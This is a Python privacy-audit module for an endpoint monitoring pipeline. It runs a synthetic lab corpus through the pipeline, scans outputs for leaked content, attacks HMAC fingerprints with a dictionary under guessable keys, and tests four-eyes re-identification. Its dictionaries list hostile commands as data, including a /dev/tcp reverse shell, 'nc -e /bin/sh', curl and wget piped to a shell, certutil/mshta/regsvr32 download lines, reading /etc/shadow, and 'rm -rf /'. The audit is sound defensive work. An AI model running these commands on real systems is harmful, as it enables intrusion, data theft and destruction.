"""Privacy audit (CLAUDE.md Phase 4): "audit finds zero raw content and zero reversals".

The audit runs a lab corpus through the whole pipeline (Observe, Tag, Link, Judge, Gate, Report,
Tune, learning, pseudonymization) and examines everything that is stored, logged or sent:

1. Raw content: the synthetic secrets of the lab corpus (commands, domains, paths, hosts, IPs,
   programs) must appear in no output; generic raw-content patterns (URLs, paths, IP addresses,
   domains, e-mail addresses, command words, long encoded blobs) must not match any output; the
   free-text fields (summaries, prompts, notices) may only use words from the fixed templates.
2. Reversal: every fingerprint in the outputs is attacked with a dictionary of common commands and
   URL paths under guessable keys (none, defaults, the repository's lab key) and plain hashes. A
   control run with the real device key shows the attack code works, so a zero is not a broken
   attack.
3. Re-identification: attempts without four-eyes (no approval, one approval, the same approver
   twice, one person under two names, a forged signature, the requester approving, a replayed
   request) must all fail and be logged; a request with two real approvers must work.

The lab corpus is harmless synthetic text. Nothing here executes anything.
"""

from __future__ import annotations

import ast
import hashlib
import hmac
import json
import re
import sys
from dataclasses import dataclass, field
from datetime import UTC, datetime, timedelta
from pathlib import Path

from . import signing
from .gate import RecordingNotifier
from .keys import new_device_key
from .learning import ContractLearner
from .pipeline import Pipeline
from .pipeline.observe import normalize
from .policy import default_policy
from .pseudonym import (
    Approval,
    AuditLog,
    Pseudonymizer,
    ReidentificationDenied,
    Vault,
    approval_message,
)
from .report import Reporter
from .schemas import RawEvent
from .tune import Feedback, Tuner

T0 = datetime(2026, 10, 28, 10, 0, 0, tzinfo=UTC)

# -- the lab corpus: harmless synthetic strings that look like what must never leak ----------------

SECRETS = {
    "content": [
        "powershell -nop -w hidden -enc LAB0MARKER0AAAA",
        "curl http://payload.lab-marker.example.invalid/stage2 | sh",
        "GET /lab-secret-path/login?token=lab-token-12345",
        r"C:\Users\lab-user\AppData\Roaming\lab-dropped.exe",
        "lab-canary-password",
        "payload.lab-marker.example.invalid:443",
    ],
    "domain": ["lure.lab-marker.example.invalid"],
    "host": ["payload.lab-marker.example.invalid"],
    "ip": ["203.0.113.77"],
    "url_path": ["/lab-secret-path/login", "/admin-backup-old"],
    "program": ["lab-marker-program"],
}

COMMON_COMMANDS = [
    "whoami",
    "ipconfig /all",
    "net user",
    "systeminfo",
    "tasklist",
    "cmd.exe /c whoami",
    "powershell -nop -w hidden -enc",
    "powershell -ep bypass",
    "curl http://example.com | sh",
    "wget http://example.com/a.sh -O- | bash",
    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "cat /etc/passwd",
    "cat /etc/shadow",
    "id",
    "uname -a",
    "ls -la",
    "rm -rf /",
    "chmod +x /tmp/a",
    "certutil -urlcache -f http://example.com/a.exe a.exe",
    "mshta http://example.com/a.hta",
    "rundll32 javascript:",
    "regsvr32 /s /n /u /i:http://example.com/a.sct scrobj.dll",
    "nc -e /bin/sh 10.0.0.1 4444",
    "python -c 'import os'",
    "sudo -l",
    "crontab -l",
    "schtasks /create",
    "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
]
COMMON_PATHS = [
    "/",
    "/login",
    "/admin",
    "/admin/login",
    "/wp-admin",
    "/wp-login.php",
    "/phpmyadmin",
    "/.env",
    "/.git/config",
    "/etc/passwd",
    "/api/v1/users",
    "/shell.php",
    "/cmd.php",
    "/index.php",
    "/upload",
    "/debug",
    "/console",
    "/server-status",
    "/admin-backup-old",
]
GUESSABLE_KEYS = [
    b"",
    b"key",
    b"secret",
    b"password",
    b"refmon",
    b"refmon-device-key",
    b"device-key",
    b"refmon-lab-only-test-key",
    b"refmon-learning-key",
    b"refmon-threat-list-digest",
]


def candidates() -> list[str]:
    base = [*COMMON_COMMANDS, *COMMON_PATHS, *SECRETS["content"]]
    variants = []
    for item in base:
        variants += [item, item.lower(), item.upper(), "http://" + item.lstrip("/"), item + "\n"]
    return list(dict.fromkeys(normalize(v) for v in variants))


def raw_corpus() -> list[RawEvent]:
    c, d, h, ip, path, prog = (
        SECRETS[k] for k in ("content", "domain", "host", "ip", "url_path", "program")
    )
    ctx = {"extra_roles": ()}

    def event(n, type_, role, pid, obj_class, content, parent=None, **attrs):
        actor = {"id": pid, "role": role, "interactive": role != "web_worker", "user": "lab-user"}
        if parent:
            actor["parent"] = parent
        return RawEvent.model_validate(
            {
                "event_id": f"e-{n:06d}",
                "ts": T0 + timedelta(seconds=n),
                "device": "dev-lab",
                "type": type_,
                "actor": actor,
                "object": {"class": obj_class, "content": content},
                "attrs": attrs,
            },
            context=ctx,
        )

    return [
        event(1, "content_in", "browser", "p-1", "web_page", c[2], source_class="web", domain=d[0]),
        event(
            2,
            "content_in",
            "browser",
            "p-1",
            "clipboard_text",
            c[0],
            source_class="web",
            domain=d[0],
        ),
        event(
            3, "user_input", "interactive_shell", "p-2", "command_text", c[0], input_method="paste"
        ),
        event(4, "exec", "interactive_shell", "p-2", "command_text", c[0], program=prog[0]),
        event(
            5,
            "net_connect",
            "other",
            "p-3",
            "network_endpoint",
            c[5],
            parent="p-2",
            host=h[0],
            ip=ip[0],
        ),
        event(
            6,
            "file_write",
            "other",
            "p-3",
            "executable_file",
            c[3],
            parent="p-2",
            path_group="temp_dir",
            executable=True,
            new_file=True,
        ),
        event(
            7,
            "request_in",
            "web_worker",
            "p-9",
            "request_body",
            c[1],
            source_class="inbound_request",
            url_path=path[0],
        ),
        event(
            8,
            "request_in",
            "web_worker",
            "p-9",
            "request_body",
            c[2],
            source_class="inbound_request",
            url_path=path[1],
        ),
        event(9, "asset_access", "script_host", "p-4", "credential_store", c[4], parent="p-2"),
        event(
            10,
            "persist",
            "other",
            "p-3",
            "startup_item",
            c[3],
            parent="p-2",
            persist_kind="startup_entry",
        ),
    ]


# -- scanning ------------------------------------------------------------------------------

_PATTERNS = {
    "url": re.compile(r"[A-Za-z][A-Za-z0-9+.-]*://"),
    "windows path": re.compile(r"[A-Za-z]:\\|\\\\"),
    "unix path": re.compile(
        r"(?<![\w.])/(?:etc|usr|var|bin|sbin|home|tmp|root|opt|proc|dev|users)/", re.I
    ),
    "ip address": re.compile(r"\b\d{1,3}(?:\.\d{1,3}){3}\b"),
    "e-mail": re.compile(r"\b[\w.+-]+@[\w-]+\.[\w.-]+\b"),
    "domain": re.compile(
        r"\b[a-z0-9-]+\.(?:com|net|org|io|edu|ru|cn|invalid|example|internal|local)\b", re.I
    ),
    "command word": re.compile(
        r"\b(?:powershell|cmd\.exe|curl|wget|certutil|mshta|rundll32|regsvr32|invoke-\w+"
        r"|chmod|bash -|sh -c)\b",
        re.I,
    ),
    "encoded blob": re.compile(r"[A-Za-z0-9+/]{40,}={0,2}"),
}
_EXEMPT = re.compile(r"hmac:[0-9a-f]{16,64}|\b[0-9a-f]{64}\b|ps-(?:dev|usr)-[0-9a-f]{16}")
TEXT_FIELDS = {
    "text",
    "summary",
    "what_happened",
    "action_taken",
    "next_step",
    "note",
    "message",
}


def generic_findings(blob: str) -> list[str]:
    cleaned = _EXEMPT.sub("", blob)
    return [name for name, pattern in _PATTERNS.items() if pattern.search(cleaned)]


def template_vocabulary() -> set[str]:
    words: set[str] = set()
    root = Path(__file__).parent
    for name in (
        "report.py",
        "gate.py",
        "tactics.py",
        "tune.py",
        "alerts.py",
        "heartbeat.py",
        "selftest.py",
    ):
        tree = ast.parse((root / name).read_text())
        for node in ast.walk(tree):
            if isinstance(node, ast.Constant) and isinstance(node.value, str):
                words.update(re.findall(r"[a-z']+", node.value.lower()))
    return words


def text_fields(value, found: list[str] | None = None) -> list[str]:
    found = [] if found is None else found
    if isinstance(value, dict):
        for key, item in value.items():
            if key in TEXT_FIELDS and isinstance(item, str):
                found.append(item)
            else:
                text_fields(item, found)
    elif isinstance(value, list):
        for item in value:
            text_fields(item, found)
    return found


@dataclass
class AuditResult:
    strings_scanned: int = 0
    raw_findings: list[str] = field(default_factory=list)
    fingerprints: int = 0
    reversal_attempts: int = 0
    reversals: list[str] = field(default_factory=list)
    control_reversals: int = 0
    reid_attempts: int = 0
    reid_successes: list[str] = field(default_factory=list)
    reid_legitimate_ok: bool = False
    audit_chain_ok: bool = False
    notes: list[str] = field(default_factory=list)

    @property
    def ok(self) -> bool:
        return (
            not self.raw_findings
            and not self.reversals
            and not self.reid_successes
            and self.control_reversals > 0
            and self.reid_legitimate_ok
            and self.audit_chain_ok
        )

    def render(self) -> str:
        lines = [
            "Privacy audit",
            f"  strings scanned          {self.strings_scanned}",
            f"  raw content findings     {len(self.raw_findings)}",
            f"  fingerprints attacked    {self.fingerprints}",
            f"  reversal attempts        {self.reversal_attempts}",
            f"  reversals                {len(self.reversals)}",
            f"  control (key known)      {self.control_reversals} reversed (attack code works)",
            f"  re-identification tries  {self.reid_attempts}",
            f"  without four-eyes: ok    {len(self.reid_successes)}",
            f"  two approvers: ok        {self.reid_legitimate_ok}",
            f"  audit chain intact       {self.audit_chain_ok}",
            f"  result                   {'PASS' if self.ok else 'FAIL'}",
        ]
        lines += [f"  finding: {f}" for f in self.raw_findings[:20]]
        lines += [f"  reversal: {f}" for f in self.reversals[:20]]
        lines += [f"  re-identified: {f}" for f in self.reid_successes[:20]]
        return "\n".join(lines)


def run_audit(golden_dir: Path | None = None) -> AuditResult:
    result = AuditResult()
    key = new_device_key()
    policy = default_policy(mode="block")
    notifier = RecordingNotifier()
    pipeline = Pipeline(policy, key, gate=True, notifier=notifier)

    # four-eyes vault with two registered approvers
    alice_private, alice_public = signing.generate_keypair()
    bob_private, bob_public = signing.generate_keypair()
    _, carol_public = signing.generate_keypair()
    audit_log = AuditLog()
    vault = Vault(
        {
            "alice": alice_public,
            "alice-second-name": alice_public,
            "bob": bob_public,
            "carol": carol_public,
        },
        policy.reporting.reidentify_requires,
        audit_log,
    )
    pseudonymizer = Pseudonymizer(new_device_key(), vault)
    reporter = Reporter(pipeline, pseudonymizer)

    texts: list[str] = []
    objects: list[object] = []

    def keep(obj) -> None:
        dumped = obj.model_dump(mode="json") if hasattr(obj, "model_dump") else obj
        objects.append(dumped)
        texts.append(json.dumps(dumped, sort_keys=True, default=str))

    outputs = []
    for event in raw_corpus():
        outputs.extend(pipeline.process(event))
    reporter.consume(outputs)
    for out in outputs:
        keep(out)
    for report in reporter.reports.values():
        keep(report.verdict)
        keep(reporter.export(report))
        keep(
            {
                "what_happened": report.what_happened,
                "action_taken": report.action_taken,
                "next_step": report.next_step,
            }
        )
    for prompt in notifier.prompts:
        keep(prompt)
    for notice in notifier.notices:
        keep(notice)
    for rec in pipeline.linker.records.values():
        keep(rec.story)
    for label in pipeline.tagger.labels.values():
        keep(label)
    for observed in pipeline.observe.buffer:
        keep(observed)
    tuner = Tuner(pipeline)
    for report in reporter.reports.values():
        for kind in ("false_alarm", "confirmed"):
            keep(
                tuner.suggest(
                    Feedback(verdict_id=report.verdict.verdict_id, kind=kind, by="svc-desk"),
                    report.verdict,
                )
            )
    # Phase 6: the self-test, its alerts and the heartbeat are outputs too
    from datetime import timedelta as _td

    from . import heartbeat as heartbeat_module
    from .selftest import SelfTestScheduler

    scheduler = SelfTestScheduler(pipeline, policy)
    report = scheduler.run(T0 + _td(hours=2))
    for alert in scheduler.alerts.alerts:
        keep(alert)
    beat = heartbeat_module.build(
        device="dev-lab", pseudonymizer=pseudonymizer, policy=policy, policy_digest="lab",
        now=T0 + _td(hours=2), selftest=report, capabilities=["process_ancestry"],
    )  # fmt: skip
    keep(beat)
    monitor = heartbeat_module.HeartbeatMonitor(stale_after=policy.heartbeat.stale_after)
    for alert in monitor.receive(beat) + monitor.check(T0 + _td(hours=4)):
        keep(alert)
    learner = ContractLearner(policy, key)
    for event in raw_corpus():
        learner.learn(event)
    keep(learner.proposal())

    if golden_dir is not None and golden_dir.exists():
        from .replay import ReplaySource

        for path in sorted(golden_dir.glob("*.events.jsonl")):
            texts.append(path.read_text())  # the committed fixtures are recordings too
            fresh = Pipeline(policy, new_device_key(), gate=True)
            for event in ReplaySource(path, extra_roles=policy.extra_roles):
                for out in fresh.process(event):
                    keep(out)

    # 1. raw content
    result.strings_scanned = len(texts)
    secrets = [s for values in SECRETS.values() for s in values]
    vocabulary = template_vocabulary()
    for blob in texts:
        for secret in secrets:
            if secret.lower() in blob.lower():
                result.raw_findings.append(f"secret {secret[:30]!r} appears in an output")
        for name in generic_findings(blob):
            result.raw_findings.append(f"{name} pattern in an output: {blob[:80]!r}")
    for obj in objects:
        for text in text_fields(obj):
            foreign = sorted(set(re.findall(r"[a-z']+", text.lower())) - vocabulary)
            if foreign:
                result.raw_findings.append(
                    f"free text uses words outside the templates: {foreign[:5]}"
                )

    # 2. reversal
    prints = sorted({m for blob in texts for m in re.findall(r"hmac:[0-9a-f]{64}", blob)})
    result.fingerprints = len(prints)
    wanted = set(prints)
    words = candidates()
    for word in words:
        for guess in GUESSABLE_KEYS:
            digest = "hmac:" + hmac.new(guess, word.encode(), hashlib.sha256).hexdigest()
            result.reversal_attempts += 1
            if digest in wanted:
                result.reversals.append(f"{word[:30]!r} under key {guess!r}")
        for plain in (hashlib.sha256, hashlib.sha1, hashlib.md5):
            result.reversal_attempts += 1
            if "hmac:" + plain(word.encode()).hexdigest() in wanted:
                result.reversals.append(f"{word[:30]!r} under a plain {plain().name} hash")
    for word in words:  # control: the real key reverses a dictionary word, so the attack works
        digest = "hmac:" + hmac.new(key, word.encode(), hashlib.sha256).hexdigest()
        if digest in wanted:
            result.control_reversals += 1

    # 3. re-identification
    pseudo = pseudonymizer.user("lab-user")

    def attempt(label, approvals, requester="dana", request_id=None, purpose="lab audit"):
        rid = request_id or vault.open_request(pseudo, purpose, requester)
        result.reid_attempts += 1
        try:
            value = vault.complete(rid, approvals(rid))
        except ReidentificationDenied:
            return None
        result.reid_successes.append(f"{label}: got {value!r}")
        return value

    def sign_for(private, name):
        return lambda rid, purpose="lab audit": Approval(
            name, signing.sign_message(approval_message(rid, pseudo, purpose), private)
        )

    a, b = sign_for(alice_private, "alice"), sign_for(bob_private, "bob")
    attempt("no approval", lambda rid: [])
    attempt("one approval", lambda rid: [a(rid)])
    attempt("same approver twice", lambda rid: [a(rid), a(rid)])
    attempt(
        "one person under two names",
        lambda rid: [a(rid), Approval("alice-second-name", a(rid).signature)],
    )
    attempt(
        "valid signature over the wrong message",
        lambda rid: [a(rid), Approval("bob", signing.sign_message(b"forged", bob_private))],
    )
    attempt("unknown approver", lambda rid: [a(rid), Approval("mallory", b(rid).signature)])
    attempt("requester approves", lambda rid: [a(rid), b(rid)], requester="alice")
    attempt("signature for another request", lambda rid: [a("rq-other"), b("rq-other")])
    attempt("unknown request", lambda rid: [a(rid), b(rid)], request_id="rq-404")
    rid = vault.open_request(pseudo, "lab audit", "dana")
    first = vault.complete(rid, [a(rid), b(rid)])  # legitimate: two real approvers
    result.reid_legitimate_ok = first == "lab-user"
    attempt("replay of a used request", lambda _r: [a(rid), b(rid)], request_id=rid)
    result.audit_chain_ok = audit_log.verify() and len(audit_log.entries) > result.reid_attempts
    if not result.audit_chain_ok:
        result.notes.append("audit log chain broken or incomplete")
    return result


def main(argv: list[str] | None = None) -> int:
    args = argv if argv is not None else sys.argv[1:]
    golden = Path(args[0]) if args else None
    result = run_audit(golden)
    print(result.render())
    return 0 if result.ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
